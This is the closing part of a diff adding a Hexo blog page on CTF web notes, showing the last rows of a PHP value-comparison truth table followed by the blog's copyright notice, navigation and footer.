+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;-1&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong><code>null</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>[]</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;php&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>true</code></strong></td>
+<td><strong><code>false</code></strong></td>
+</tr>
+<tr>
+<td align="left"><code>&quot;&quot;</code></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td align="left"><strong><code>false</code></strong></td>
+<td><strong><code>true</code></strong></td>
+</tr>
+</tbody></table>
+</script></p></div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>clingm</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2022/02/17/CTF-Web-%E6%9D%82%E8%AE%B0-md/" title="CTF-Web-杂记">http://example.com/2022/02/17/CTF-Web-%E6%9D%82%E8%AE%B0-md/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/02/16/hello-world/" rel="next" title="Hello World"><span class="post-nav-text">Hello World</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> clingm</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.0.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.8.8</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
